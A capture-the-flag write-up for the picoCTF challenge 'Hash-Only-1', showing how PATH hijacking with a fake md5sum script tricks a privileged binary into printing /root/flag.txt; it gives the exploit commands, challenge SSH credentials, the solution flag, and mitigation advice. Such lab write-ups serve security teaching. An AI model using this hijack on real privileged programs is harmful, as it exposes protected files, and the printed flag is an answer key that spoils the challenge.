
## Hash-Only-1 Writeup

### Challenge Details

**Name:** Hash-Only-1  
**Points:** 100  
**Author:** Junias Bonou

**Description:**  
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Connect using SSH:

```
ssh ctf-player@shape-facility.picoctf.net -p 49909
```

Password: `84b12bae`  
Run the binary named `flaghasher`.

---

### Exploitation

1. **Understanding the Challenge:**
    
    - The `flaghasher` binary reads the flag file (`/root/flag.txt`) but only outputs its MD5 hash.
        
    - We need a way to retrieve the actual contents of `/root/flag.txt` instead of its hash.
        
2. **Leveraging** `**PATH**` **Hijacking:**
    
    - Since Linux binaries use the `PATH` environment variable to locate executables, we can create our own version of `md5sum` that simply prints the file's contents.
        
    - We will create a fake `md5sum` script that reads and displays the flag instead of hashing it.
        
3. **Steps to Exploit:**
    
    - Create a directory for our custom binaries:
        
        ```
        mkdir /tmp/bin
        ```
        
    - Create a fake `md5sum` script that outputs the contents of any file passed to it:
        
        ```
        echo '#!/bin/bash' > /tmp/bin/md5sum
        echo 'cat "$@" | tee /tmp/output' >> /tmp/bin/md5sum
        chmod +x /tmp/bin/md5sum
        ```
        
    - Prepend `/tmp/bin` to `PATH` so our fake `md5sum` is used instead of the real one:
        
        ```
        PATH=/tmp/bin:$PATH ./flaghasher
        ```
        
    - Since `flaghasher` calls `md5sum` internally, it now runs our fake script instead, which reads and prints `/root/flag.txt`!
        
4. **Flag Retrieved:**
    
    ```
    picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_0c1fd083}
    ```
    ![[Pasted image 20250313234554.png]]

---

### Lessons Learned

- **Understanding Binary Execution:** The challenge required knowledge of how Linux searches for executables using the `PATH` variable.
    
- **Exploiting PATH Hijacking:** By creating a malicious script named `md5sum` in a directory we control, we successfully tricked the binary into running our code.
    
- **Privilege Abuse in CTFs:** Programs that execute system commands can often be manipulated if they do not use absolute paths to critical binaries.
    

**Mitigation Strategies:**

- Developers should always use absolute paths for system commands, e.g., `/usr/bin/md5sum` instead of `md5sum`.
    
- Restrict unnecessary execution privileges.
    

---

### Conclusion

By leveraging `PATH` hijacking, we successfully tricked `flaghasher` into revealing the flag instead of its hash. This challenge highlights the importance of secure coding practices in privileged binaries.